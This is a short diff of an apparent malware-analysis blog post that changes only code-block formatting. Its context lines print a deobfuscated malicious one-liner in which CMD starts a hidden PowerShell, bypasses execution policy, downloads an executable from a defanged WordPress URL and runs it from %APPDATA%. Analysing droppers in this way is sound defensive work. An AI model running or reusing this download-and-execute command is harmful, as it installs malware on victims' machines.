@@ -103,9 +103,9 @@ print  "".join(a).replace("^", "")
 
 Which gave me the following one-liner that downloads an executable with PowerShell and executes it (URL escapes are mine):
 
-```
+{% highlight text %}
 "CMD.exe /C poWeRsHElL.EXe     -eXECUTIonPoLICy bypAss    -NOprOFile -winDowSTyLE    hIDden   (neW-ObjeCT    sySteM.NET.WEbcLiEnT).dOWNloadFIlE('http://nicklovegrove[.]co[.]uk/wp-content/margin2601_onechat_word.exe','%APPdAta%.Exe');sTArT-pROCEsS '%APpdaTa%.ExE"
-```
+{% endhighlight %}
 
 Let's hash it !
 
